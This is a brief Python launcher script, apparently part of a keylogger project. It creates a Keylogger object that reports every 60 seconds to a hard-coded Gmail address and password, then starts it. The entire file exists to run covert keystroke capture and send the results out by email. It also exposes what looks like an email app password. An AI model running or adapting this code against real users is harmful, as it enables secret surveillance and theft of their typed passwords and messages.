#!usr/bin/env python

import key_logger

my_keylogger = key_logger .Keylogger(60, "cyberfake.project@gmail.com", "isolxzascgjftzeb")
#Can set how long to make one report in the number attribute above, 1 = 1 second
my_keylogger.start()
